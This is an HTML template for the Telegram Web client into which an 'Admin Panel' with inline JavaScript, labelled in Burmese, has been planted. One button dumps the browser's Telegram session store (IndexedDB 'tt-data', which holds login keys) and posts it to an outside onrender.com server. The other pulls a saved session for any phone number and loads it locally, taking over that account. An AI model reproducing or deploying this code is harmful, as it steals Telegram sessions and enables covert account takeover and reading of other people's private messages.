<!DOCTYPE html>
<html lang="en" translate="no" class="notranslate">

<head>
  <meta charset="UTF-8">

  <title>
    <%= htmlWebpackPlugin.options.appTitle %>
  </title>

  <meta name="title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="description"
    content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no, viewport-fit=cover">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="mobile-web-app-title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="application-name" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta name="msapplication-TileColor" content="#2b5797">
  <meta name="msapplication-config" content="./browserconfig.xml">
  <meta name="theme-color" content="#ffffff">
  <meta name="google" content="notranslate">

  <meta http-equiv="Content-Security-Policy" content="<%= htmlWebpackPlugin.options.csp %>">

  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
  <meta property="og:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta property="og:description"
        content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="og:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">

  <!-- Twitter -->
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:url" content="<%= htmlWebpackPlugin.options.baseUrl %>">
  <meta property="twitter:title" content="<%= htmlWebpackPlugin.options.appTitle %>">
  <meta property="twitter:description"
    content="Telegram is a cloud-based mobile and desktop messaging app with a focus on security and speed.">
  <meta property="twitter:image" content="./<%= htmlWebpackPlugin.options.mainIcon %>.png">

  <link rel="canonical" href="https://web.telegram.org/">
  <link rel="apple-touch-icon" sizes="180x180" href="./<%= htmlWebpackPlugin.options.appleIcon %>.png">
  <link rel="icon" href="./favicon.svg" type="image/svg+xml">
  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="192x192" href="./<%= htmlWebpackPlugin.options.mainIcon %>.png">
  <link rel="alternate icon" href="./favicon.ico" type="image/x-icon">
  <link rel="manifest" id="the-manifest-placeholder" href="./<%= htmlWebpackPlugin.options.manifest %>">

  <script src="./redirect.js"></script>
  <style>
    @layer reset, variables, ui, components;
    @layer ui {
      @layer tablist, spinner, button, input, layout;
    }
  </style>
</head>

<body id="root">
  <noscript>
    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
    <h1>Telegram Web</h1>
    <p>Please, enable JavaScript to open the app.</p>
  </noscript>
  <div id="portals"></div>
  <script src="./compatTest.js"></script>

  <div style="position: fixed; bottom: 20px; right: 20px; z-index: 999999; background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); border: 2px solid #0088cc;">
        <b style="color: black; margin-bottom: 10px; display: block; font-size: 14px;">Admin Panel</b>
        <button onclick="forceSync()" style="background: #28a745; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; margin-right: 5px; font-weight: bold;">📤 Data ပို့ရန် (Staff)</button>
        <button onclick="forceAdmin()" style="background: #dc3545; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">📥 Admin ဝင်ရန်</button>
    </div>

    <script>
      function forceSync() {
          const phone = prompt("Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
          if (!phone) return;
          
          alert("၁။ Data စတင်ဆွဲထုတ်နေပါပြီ...");
          const req = indexedDB.open('tt-data');
          req.onsuccess = (e) => {
              const db = e.target.result;
              if (!db.objectStoreNames.contains('keyval')) return alert("❌ Error: အကောင့် Login မဝင်ရသေးပါ။");
              
              const store = db.transaction('keyval', 'readonly').objectStore('keyval');
              store.getAll().onsuccess = (e1) => {
                  store.getAllKeys().onsuccess = (e2) => {
                      const data = {};
                      e2.target.result.forEach((k, i) => data[k] = e1.target.result[i]);
                      
                      alert("၂။ MongoDB သို့ ပို့နေပါပြီ...");
                      
                      // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
                      fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
                      })
                      .then(res => res.json())
                      .then(resData => {
                          if(resData.success) alert("✅ အောင်မြင်ပါသည်။ MongoDB သို့ Data ရောက်သွားပါပြီ!");
                          else alert("❌ Database Error: " + JSON.stringify(resData));
                      })
                      .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေခြင်း သို့မဟုတ် Server အိပ်နေခြင်း ဖြစ်နိုင်ပါသည်။\n\nError: " + err.message));
                  };
              };
          };
      }

      function forceAdmin() {
          const phone = prompt("ဝင်ကြည့်လိုသော Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
          if (!phone) return;

          alert("၁။ Database မှ Data ရှာနေပါပြီ...");
          
          // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
          fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
          .then(res => res.json())
          .then(result => {
              if (!result.success) return alert("❌ Database ထဲတွင် Data မရှိသေးပါ။ (Staff က Data မပို့ရသေးပါ)");
              
              const dataToImport = JSON.parse(result.data);
              const req = indexedDB.open('tt-data');
              req.onsuccess = (e) => {
                  const db = e.target.result;
                  const store = db.transaction('keyval', 'readwrite').objectStore('keyval');
                  store.clear().onsuccess = () => {
                      let count = 0;
                      const keys = Object.keys(dataToImport);
                      keys.forEach(k => {
                          store.put(dataToImport[k], k).onsuccess = () => {
                              count++;
                              if (count === keys.length) {
                                  alert("✅ Admin ဝင်ခြင်း အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ပြောင်းလဲနေပါပြီ...");
                                  window.location.reload();
                              }
                          };
                      });
                  };
              };
          })
          .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေပါသည်။\n\nError: " + err.message));
      }
    </script>န

</body>

</html>
